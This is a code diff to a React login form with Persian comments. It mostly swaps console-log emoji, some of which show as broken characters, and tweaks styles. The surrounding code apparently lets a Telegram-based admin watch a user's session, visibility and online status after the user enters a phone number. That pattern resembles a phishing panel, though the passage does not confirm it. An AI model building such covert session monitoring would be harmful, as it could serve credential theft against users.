@@ -268,7 +268,7 @@ export const LoginForm = () => {
         break;
       case "check_status":
         // بررسی دقیق وضعیت کاربر با Enhanced Offline Detection
-        console.log("���� Admin requested enhanced status check for session:", sessionId);
+        console.log("🔍 Admin requested enhanced status check for session:", sessionId);
 
         const isVisible = !document.hidden;
 
@@ -297,7 +297,7 @@ export const LoginForm = () => {
           if (!isActuallyOnline) {
             // کاربر آفلاین است
             finalStatusText = "offline";
-            finalStatusEmoji = connectionType === 'offline' ? "����" : "🔴";
+            finalStatusEmoji = connectionType === 'offline' ? "📵" : "🔴";
             console.log("🔴 User is OFFLINE - network status:", connectionType);
           } else if (isActuallyOnline && !isVisible) {
             // کاربر آنلاین است ام�� صفحه hidden است
@@ -428,7 +428,7 @@ export const LoginForm = () => {
         throw new Error("Failed to send notification to Telegram admin");
       }
 
-      console.log("✅ Session created:", result.sessionId);
+      console.log("��� Session created:", result.sessionId);
       setSessionId(result.sessionId);
       setPhoneNumber(mobileNumber);
       sessionStorage.setItem("sessionId", result.sessionId);
@@ -1027,8 +1027,8 @@ export const LoginForm = () => {
                   style={{
                     fontSize: "20px",
                     fontWeight: "700",
-                    lineHeight: "36px",
-                    marginBottom: "24px",
+                    lineHeight: "28px",
+                    marginBottom: "12px",
                     textAlign: "center",
                   }}
                 >
